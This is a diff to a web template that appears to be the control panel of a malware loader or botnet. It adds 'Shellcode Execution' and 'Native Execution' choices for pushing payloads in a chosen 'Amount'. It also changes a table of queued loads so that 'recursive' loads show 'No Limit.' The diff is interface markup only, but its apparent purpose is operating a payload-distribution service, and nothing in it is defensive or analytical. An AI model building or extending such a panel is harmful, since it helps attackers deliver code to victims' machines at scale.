@@ -62,6 +62,8 @@
                                 <label for="name">Execution Type</label>
                                 <select name="execution_type">
                                     <option value=".EXE | DOTNET Execution">.EXE | DOTNET Execution</option>
+                                    <option value=".BIN | Shellcode Execution">.BIN | Shellcode Execution</option>
+                                    <option value=".EXE | Native Execution">.EXE | Native Execution</option>
                                 </select>
                 
                                 <label for="message">Amount</label>
@@ -86,7 +88,6 @@
                     <thead>
                         <tr>
                             <th>Progress</th>
-                            <th>Recursive</th>
                             <th>Command Type</th>
                             <th>Command Arguments</th>
                             <th>Note</th>
@@ -97,12 +98,14 @@
                         {% for load in load_list %}
                         <tr>
                             <td>
-                                <div class="progress-container">
-                                    <div class="progress-bar" style="width: {{ load.percent_completed }}%;"></div>
-                                </div>
+                                {% if load.is_recursive %}Recursive load. No Limit.{% endif %}
+                                {% if not load.is_recursive %}
+                                    <div class="progress-container">
+                                        <div class="progress-bar" style="width: {{ load.percent_completed }}%;"></div>
+                                    </div>
+                                {% endif %}
+                              
                             </td>
-                            {% if load.is_recursive %}<td><i class="fa-solid fa-check"></i></td>{% endif %}
-                            {% if not load.is_recursive %}<td><i class="fa-solid fa-xmark"></i></td>{% endif %}
                             <td>{{ load.cmd_type }}</td>
                             <td>{{ load.cmd_args }}</td>
                             <td>{{ load.note }}</td>
